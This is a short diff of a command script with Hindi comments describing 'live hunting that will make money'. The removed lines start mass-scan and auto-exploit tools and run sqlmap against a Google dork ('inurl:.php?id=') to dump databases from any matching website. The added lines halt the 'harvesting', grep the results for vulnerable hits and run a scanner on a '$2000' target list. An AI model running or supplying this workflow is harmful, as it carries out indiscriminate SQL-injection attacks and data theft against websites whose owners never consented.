@@ -1,5 +1,6 @@
-# स्टेप 1: सारे टूल्स को एक साथ एक्टिवेट करो
-python3 sniper_pro.py --mass-scan & 
-python3 the_conqueror.py --auto-exploit & 
-# स्टेप 2: लाइव हंटिंग शुरू करो जिससे पैसा बनेगा
-python3 sqlmap/sqlmap.py -g "inurl:.php?id=" --batch --smart --level=3 --risk=2 --dbs > final_report.txt
+# स्टेप 1: हार्वेस्टिंग रोकें और डेटा सेव करें
+pkill -f the_conqueror.py && echo "HARVEST COMPLETED"
+# स्टेप 2: अब तक के रिवार्ड्स और बग्स की लिस्ट देखें
+cat final_report.txt | grep "Vulnerable" || echo "Processing Raw Data..."
+# स्टेप 3: $2000 वाले टारगेट की अगली फाइल रन करें
+python3 sniper_pro.py --target-list results.txt
